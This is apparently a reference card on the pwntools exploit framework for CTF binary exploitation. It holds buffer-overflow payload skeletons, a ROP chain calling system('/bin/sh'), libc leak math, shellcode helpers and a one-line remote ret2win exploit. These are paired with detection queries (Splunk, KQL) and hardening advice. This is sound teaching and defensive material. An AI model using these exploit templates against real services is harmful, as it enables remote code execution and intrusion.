name: pwntools - CTF / Exploit Development Framework
description: pwntools is a Python library for exploit development and CTF binary exploitation. It streamlines connecting to local/remote targets, packing addresses, building ROP chains, crafting shellcode, handling I/O, and leaking/overwriting memory - turning a crash into a working exploit quickly.
notes:
=== INSTALL ===
  pip install pwntools

=== SKELETON ===
  from pwn import *
  context.binary = elf = ELF('./vuln')     # sets arch/bits/endian
  context.log_level = 'debug'
  # io = process('./vuln')                 # local
  io = remote('<ip>', <port>)              # remote

=== BUILD THE PAYLOAD ===
  offset = 72
  payload  = b'A'*offset
  payload += p64(elf.sym['win'])           # pack address (64-bit)
  io.sendline(payload)
  io.interactive()

=== ROP ===
  rop = ROP(elf)
  rop.call('system', [next(elf.search(b'/bin/sh'))])
  payload = flat({offset: rop.chain()})

=== LEAKS / FORMAT STRING ===
  leak = u64(io.recvline().strip().ljust(8, b'\x00'))
  libc = ELF('./libc.so.6'); libc.address = leak - libc.sym['puts']

=== HELPERS ===
  cyclic(200) / cyclic_find(0x6161616c)    # find EIP/RIP offset
  shellcraft.sh() ; asm(shellcraft.sh())
  checksec ./vuln                          # (pwntools CLI) show mitigations

=== ALTERNATIVES ===
  ROPgadget / ropper   # gadget finding
  one_gadget           # libc one-shot RCE gadgets
  gdb + pwndbg/gef     # dynamic analysis

examples.label: Remote ret2win skeleton
examples.command: python3 -c 'from pwn import *; e=ELF("./vuln"); io=remote("<ip>",<port>); io.sendline(b"A"*72+p64(e.sym["win"])); io.interactive()'

recommended.note: ROPgadget to source gadgets for pwntools ROP chains.
one_gadget for a libc single-shot RCE.
gdb/pwndbg for dynamic analysis of the crash.

defense.why_it_works: Memory-corruption bugs (overflows, use-after-free, format strings) let an attacker control execution flow. pwntools automates the mechanics (offset finding, address packing, ROP, leaks) so exploitation of a vulnerable, under-hardened binary is fast and reliable.
defense.prerequisites: A memory-corruption vulnerability in the target binary; network/local access to trigger it.
defense.impact: Reliable remote/local code execution or privilege escalation by exploiting the vulnerable process.
defense.detection: [MITRE T1203] On the target: repeated process crashes/segfaults preceding success, EDR memory-protection alerts (ROP/stack-pivot), WER/core-dump bursts, and anomalous child processes (shell) from a service.
defense.artifacts: Core dumps and segfault logs (dmesg, /var/log), EDR exploit-guard events, unexpected /bin/sh child of a network service, crash-loop telemetry.
defense.splunk_spl:
index=linux sourcetype=linux:syslog (segfault OR "general protection" OR core_dumped)
| stats count by host, process
| where count > 3
defense.elastic_kql: message:(segfault or core_dumped) or process.parent.name:(nginx or apache2 or custom-service) and process.name:(sh or bash or dash)
defense.sentinel_kql:
Syslog
| where SyslogMessage has_any ("segfault","core dumped","general protection")
| summarize Count=count() by HostName, ProcessName, bin(TimeGenerated, 5m)
| where Count > 3
defense.prevention: Build with all mitigations (NX/DEP, ASLR/PIE, stack canaries, RELRO, CFG/CET); fuzz and fix memory bugs; use memory-safe languages for new code; sandbox/seccomp network services; EDR exploit protection; restart-on-crash with alerting so crash-looping is visible.

detections.name: Service crash-loop followed by shell (exploitation)
detections.logic:
Syslog
| where SyslogMessage has_any ("segfault","core dumped","general protection")
| summarize Count=count() by HostName, ProcessName, bin(TimeGenerated, 5m)

detections.tuning: Correlate crash bursts with a new child shell or outbound connection
